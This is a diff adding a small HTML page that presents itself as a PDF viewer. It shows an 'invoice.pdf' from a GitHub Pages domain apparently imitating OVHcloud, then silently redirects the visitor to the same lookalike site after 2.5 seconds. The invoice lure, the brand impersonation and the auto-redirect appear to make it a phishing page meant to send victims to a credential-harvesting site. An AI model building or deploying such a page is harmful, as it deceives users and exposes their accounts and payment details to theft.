@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PDF Viewer</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+        }
+        #pdf-frame {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+    </style>
+</head>
+<body>
+
+    <iframe id="pdf-frame" src="https://ovhcloud-com.github.io/invoice.pdf" allowfullscreen></iframe>
+
+    <script>
+        // Wait for 2.5 seconds, then redirect to the target URL
+        setTimeout(function() {
+            window.location.href = "https://ovhcloud-com.github.io/index.html?";
+        }, 2500);
+    </script>
+
+</body>
+</html>
